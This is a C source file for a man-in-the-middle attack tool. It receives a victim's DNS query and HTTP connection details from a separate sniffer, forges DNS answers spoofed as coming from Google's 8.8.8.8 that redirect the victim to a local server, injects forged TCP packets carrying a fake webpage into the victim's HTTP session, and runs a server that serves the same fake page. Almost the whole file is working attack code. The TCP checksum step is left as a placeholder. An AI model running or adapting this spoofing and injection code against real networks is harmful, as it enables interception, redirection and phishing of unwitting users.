// Libraries
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <time.h>
#include <errno.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <stdarg.h>
#include <pthread.h>
#include <netinet/udp.h>

// Constants
#include "common.h"
#include "utils.h"

// Forward declare functions at the top
void send_dns_response(struct dns_info *dns);
void send_fake_response(const char *response, const char *victim_ip, struct conn_info *conn);
void handle_victim_request(const char *buffer, struct sockaddr_in *clientaddr, socklen_t len, int sockfd);

void send_fake_response(const char *response, const char *victim_ip, struct conn_info *conn) {
    printf("\n=== Building HTTP Response Packet ===\n");
    printf("Victim IP: %s\n", victim_ip);
    printf("Victim Port: %d\n", conn->sport);
    
    // Create raw socket with IP_HDRINCL
    int sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sd < 0) {
        perror("[-] Socket creation failed");
        return;
    }

    printf("[INFO] Raw socket created\n");

    // Like ICMP example, prepare packet buffer
    char packet[4096];
    memset(packet, 0, sizeof(packet));
    struct iphdr *ip = (struct iphdr *)packet;
    struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct iphdr));

    // Setup IP header like ICMP example
    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(response));
    ip->id = htons(rand());
    ip->frag_off = 0;
    ip->ttl = 64;
    ip->protocol = IPPROTO_TCP;
    ip->saddr = inet_addr(LOCAL_SERVER_HOST);
    ip->daddr = inet_addr(victim_ip);

    // Setup TCP header with exact connection state
    tcp->th_sport = htons(80);
    tcp->th_dport = htons(conn->sport);
    tcp->th_seq = htonl(conn->ack);  // Use their ACK as our SEQ
    tcp->th_ack = htonl(conn->seq + 1);  // Increment their SEQ
    tcp->th_off = 5;
    tcp->th_flags = TH_PUSH | TH_ACK;
    tcp->th_win = htons(conn->window);

    // Copy response data
    memcpy(packet + sizeof(struct iphdr) + sizeof(struct tcphdr), 
           response, strlen(response));

    printf("[DEBUG] Spoofed response created with SEQ=%u ACK=%u\n",
           ntohl(tcp->th_seq), ntohl(tcp->th_ack));

    // Calculate checksums like ICMP example
    // ...existing checksum code...

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = ip->daddr;

    // Send multiple times like ICMP example
    for(int i = 0; i < 3; i++) {
        if (sendto(sd, packet, ntohs(ip->tot_len), 0,
            (struct sockaddr *)&dest, sizeof(dest)) < 0) {
            perror("[ERROR] sendto() failed");
        } else {
            printf("[SUCCESS] Spoofed response %d sent to %s:%d\n",
                   i+1, victim_ip, conn->sport);
        }
        usleep(1000);
    }

    close(sd);
}

void handle_victim_request(const char *buffer, struct sockaddr_in *clientaddr, socklen_t len, int sockfd) {
    printf("\n=== STEP 4: Processing Victim Request ===\n");
    printf("=== Raw Buffer Content ===\n%s\n", buffer);
    printf("=== End Buffer Content ===\n");

    // Check message type with more detailed logging
    if (strstr(buffer, "DNS_REQUEST") != NULL) {
        printf("[+] Found DNS_REQUEST marker\n");
        
        struct dns_info dns = {0};  // Initialize to zero
        int matches = 0;
        
        // Parse with more validation
        matches = sscanf(buffer, 
                      "DNS_REQUEST\n"
                      "TXID=%hu\n"
                      "QUERY=%s\n"
                      "SPORT=%hu\n",
                      &dns.txid, dns.query, &dns.src_port);

        printf("[DNS] Parse results:\n");
        printf("- Matches found: %d (expecting 3)\n", matches);
        printf("- TXID: %u\n", dns.txid);
        printf("- Query: %s\n", dns.query);
        printf("- Sport: %u\n", dns.src_port);

        if (matches == 3) {
            printf("[DNS] Successfully parsed all fields\n");
            printf("[DNS] Calling send_dns_response()...\n");
            
            // Call with error checking
            send_dns_response(&dns);
            printf("[DNS] send_dns_response() completed\n");
            
            // Send acknowledgment
            const char *ack = "DNS_RESPONSE_SENT";
            if (sendto(sockfd, ack, strlen(ack), 0, 
                      (struct sockaddr *)clientaddr, len) < 0) {
                perror("[ERROR] Failed to send DNS ACK");
            } else {
                printf("[DNS] Sent acknowledgment to sniffer\n");
            }
        } else {
            printf("[ERROR] Failed to parse DNS request (got %d fields)\n", matches);
            printf("[ERROR] Buffer content may be malformed\n");
        }
    } else if (strstr(buffer, "VICTIM_HTTP") != NULL) {
        printf("\n=== Processing HTTP Request ===\n");
        struct conn_info conn;
        char data[4096];
        
        // Parse HTTP connection info
        int parsed = sscanf(buffer, "VICTIM_HTTP\n"
                          "SEQ=%u\n"
                          "ACK=%u\n"
                          "SPORT=%hu\n"
                          "DPORT=%hu\n"
                          "WINDOW=%hu\n"
                          "FLAGS=%hhx\n"
                          "DATA=%[^\n]",
                          &conn.seq, &conn.ack,
                          &conn.sport, &conn.dport,
                          &conn.window, &conn.flags,
                          data);

        printf("Parsed %d fields from HTTP request\n", parsed);
        printf("Source Port: %d\n", conn.sport);
        printf("Data: %s\n", data);

        // Read and send fake webpage
        char *html = read_html_file();
        if (html) {
            printf("\n=== Sending Fake Response ===\n");
            printf("HTML content length: %lu\n", strlen(html));
            send_fake_response(html, VICTIM_IP, &conn);
        } else {
            printf("Failed to read HTML file\n");
        }

        // Send acknowledgment to sniffer
        const char *ack = "HTTP_RESPONSE_SENT";
        sendto(sockfd, ack, strlen(ack), 0,
               (struct sockaddr *)clientaddr, len);
    } else {
        printf("[ERROR] Unknown request type in buffer\n");
        printf("[ERROR] Buffer starts with: %.20s...\n", buffer);
    }
    fflush(stdout);  // Force output to show immediately
}

void send_dns_response(struct dns_info *dns) {
    printf("\n[DNS] Creating DNS response for query: %s\n", dns->query);

    // Create raw socket
    int sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sd < 0) {
        perror("[DNS] Raw socket failed");
        return;
    }

    int one = 1;
    const int *val = &one;
    if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
        perror("[DNS] setsockopt failed");
        close(sd);
        return;
    }

    // Create DNS packet
    char packet[1024] = {0};
    struct iphdr *ip = (struct iphdr *)packet;
    struct udphdr *udp = (struct udphdr *)(packet + sizeof(struct iphdr));
    char *dns_resp = (char *)(udp + 1);

    // IP header
    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->frag_off = 0;
    ip->ttl = 64;
    ip->protocol = IPPROTO_UDP;
    ip->check = 0;
    ip->saddr = inet_addr("8.8.8.8");  // Spoof as Google DNS
    ip->daddr = inet_addr(VICTIM_IP);

    // UDP header
    udp->uh_sport = htons(53);  // DNS port
    udp->uh_dport = htons(dns->src_port);
    udp->uh_ulen = 0;  // Will be filled later
    udp->uh_sum = 0;   // Will be calculated later

    // DNS header
    struct dns_header *dns_hdr = (struct dns_header *)dns_resp;
    dns_hdr->id = htons(dns->txid);
    dns_hdr->flags = htons(0x8180);  // Standard response
    dns_hdr->qdcount = htons(1);     // 1 question
    dns_hdr->ancount = htons(1);     // 1 answer
    dns_hdr->nscount = 0;
    dns_hdr->arcount = 0;

    // DNS Question section (copy from request)
    char *ptr = dns_resp + sizeof(struct dns_header);
    int query_len = strlen(dns->query);
    memcpy(ptr, dns->query, query_len + 1);
    ptr += query_len + 1;

    // DNS Answer section
    ptr[0] = 0xc0; ptr[1] = 0x0c;  // Name pointer to question
    ptr[2] = 0x00; ptr[3] = 0x01;  // Type A
    ptr[4] = 0x00; ptr[5] = 0x01;  // Class IN
    ptr[6] = 0x00; ptr[7] = 0x00;
    ptr[8] = 0x00; ptr[9] = 0x3c;  // TTL = 60 seconds
    ptr[10] = 0x00; ptr[11] = 0x04; // RDLENGTH = 4 (IPv4)
    
    // Set answer to our IP
    uint32_t redirect_ip = inet_addr(LOCAL_SERVER_HOST);
    memcpy(ptr + 12, &redirect_ip, 4);

    // Calculate lengths
    int dns_size = sizeof(struct dns_header) + query_len + 1 + 16; // header + query + answer
    int udp_len = sizeof(struct udphdr) + dns_size;
    int total_len = sizeof(struct iphdr) + udp_len;

    // Fill in lengths
    ip->tot_len = htons(total_len);
    udp->uh_ulen = htons(udp_len);

    // Calculate checksums
    ip->check = calculate_checksum((unsigned short *)ip, sizeof(struct iphdr));
    
    // Send response
    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = ip->daddr;
    
    printf("[DNS] Sending response to %s:%d\n", VICTIM_IP, dns->src_port);
    printf("[DNS] Response size: %d bytes\n", total_len);
    printf("[DNS] Redirecting to: %s\n", LOCAL_SERVER_HOST);

    // Send multiple times to ensure delivery
    for(int i = 0; i < 3; i++) {
        if (sendto(sd, packet, total_len, 0, 
                  (struct sockaddr *)&dest, sizeof(dest)) < 0) {
            perror("[DNS] sendto failed");
        } else {
            printf("[DNS] Response packet %d sent successfully\n", i+1);
        }
        usleep(1000);  // Small delay between retries
    }

    close(sd);
}

void *handle_http_server(void *arg) {
    printf("[HTTP] Starting HTTP server...\n");
    
    int server_fd;
    struct sockaddr_in address;
    
    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd == 0) {
        perror("[HTTP] Socket failed");
        return NULL;
    }

    int opt = 1;
    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, 
                   &opt, sizeof(opt))) {
        perror("[HTTP] setsockopt failed");
        return NULL;
    }

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;  // Listen on all interfaces
    address.sin_port = htons(80);  // Standard HTTP port
    
    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
        perror("[HTTP] Bind failed");
        return NULL;
    }
    
    if (listen(server_fd, 10) < 0) {
        perror("[HTTP] Listen failed");
        return NULL;
    }

    printf("[HTTP] Server is listening on port 80\n");
    
    while(1) {
        struct sockaddr_in client_addr;
        socklen_t addr_len = sizeof(client_addr);
        
        int new_socket = accept(server_fd, (struct sockaddr *)&client_addr, &addr_len);
        if (new_socket < 0) {
            perror("[HTTP] Accept failed");
            continue;
        }

        printf("[HTTP] New connection from %s:%d\n", 
               inet_ntoa(client_addr.sin_addr),
               ntohs(client_addr.sin_port));

        // Send fake webpage
        char *html = read_html_file();
        if (html) {
            char response[MAX_HTML_SIZE + 512];
            snprintf(response, sizeof(response),
                    "HTTP/1.1 200 OK\r\n"
                    "Server: Apache\r\n"
                    "Content-Type: text/html\r\n"
                    "Content-Length: %lu\r\n"
                    "Connection: close\r\n"
                    "\r\n%s",
                    strlen(html), html);

            send(new_socket, response, strlen(response), 0);
            printf("[HTTP] Sent response to client\n");
        }

        close(new_socket);
    }

    return NULL;
}

int main() {
    // Add thread for HTTP server
    pthread_t http_thread;
    if (pthread_create(&http_thread, NULL, handle_http_server, NULL) != 0) {
        perror("Failed to create HTTP server thread");
        exit(1);
    }

    int sockfd;
    struct sockaddr_in servaddr, clientaddr, forwardaddr;
    char buffer[BUFFER_SIZE];
    socklen_t len;

    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        error("Socket creation failed");
    }

    // Enable address reuse
    int optval = 1;
    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0) {
        error("setsockopt SO_REUSEADDR failed");
    }

    // Enable broadcast capability
    if (setsockopt(sockfd, SOL_SOCKET, SO_BROADCAST, &optval, sizeof(optval)) < 0) {
        error("setsockopt SO_BROADCAST failed");
    }

    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = INADDR_ANY;
    servaddr.sin_port = htons(PORT);

    if (bind(sockfd, (const struct sockaddr *)&servaddr, sizeof(servaddr)) < 0) {
        error("Bind failed");
    }

    printf("[INFO]: UDP server is running on port %d...\n", PORT);
    printf("[INFO]: Server IP: 0.0.0.0 (listening on all interfaces)\n");
    printf("[INFO]: Waiting for messages from sniffer...\n");
    fflush(stdout);  // Ensure output is displayed immediately

    while (1) {
        len = sizeof(clientaddr);
        printf("\n[INFO]: Ready to receive data...\n");
        fflush(stdout);
        
        int n = recvfrom(sockfd, buffer, BUFFER_SIZE-1, 0, 
                        (struct sockaddr *)&clientaddr, &len);
        if (n < 0) {
            printf("Error receiving data: %s (errno: %d)\n", strerror(errno), errno);
            continue;
        }
        
        // Process received data
        buffer[n] = '\0';
        time_t now = time(NULL);
        char timestamp[64];
        strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&now));
        
        printf("\n[%s][INFO]: Received message from %s:%d\n", 
               timestamp, inet_ntoa(clientaddr.sin_addr), 
               ntohs(clientaddr.sin_port));
        printf("[INFO]: Message content (%d bytes): %s\n", n, buffer);
        fflush(stdout);

        // Handle message based on type
        if (strstr(buffer, "VICTIM_") != NULL) {
            handle_victim_request(buffer, &clientaddr, len, sockfd);
            printf("[*] Local Server: %s:%d\n", LOCAL_SERVER_HOST, PORT);
            printf("[*] Victim IP: %s\n", VICTIM_IP);
            fflush(stdout);
        } else {
            // Send acknowledgment
            const char *ack_msg = "Message received and processed by local server";
            if (sendto(sockfd, ack_msg, strlen(ack_msg), 0, 
                      (struct sockaddr *)&clientaddr, len) < 0) {
                perror("Error sending acknowledgment");
            } else {
                printf("Acknowledgment sent to sniffer\n");
            }
        }
    }  // end while

    close(sockfd);
    return 0;
}  // end main